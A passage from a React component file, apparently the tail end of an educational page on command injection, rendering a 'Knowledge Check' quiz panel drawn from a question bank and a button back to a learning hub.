            mb: 4,
            borderRadius: 3,
            border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
            bgcolor: alpha(ACCENT_COLOR, 0.03),
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <QuizIcon sx={{ color: ACCENT_COLOR }} />
            Knowledge Check
          </Typography>
          <QuizSection
            questions={quizQuestions}
            accentColor={ACCENT_COLOR}
            title="Command Injection Knowledge Check"
            description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
            questionsPerQuiz={QUIZ_QUESTION_COUNT}
          />
        </Paper>

        {/* Bottom Navigation */}
        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
          >
            Back to Learning Hub
          </Button>
        </Box>

      </Container>
    </LearnPageLayout>
  );
}

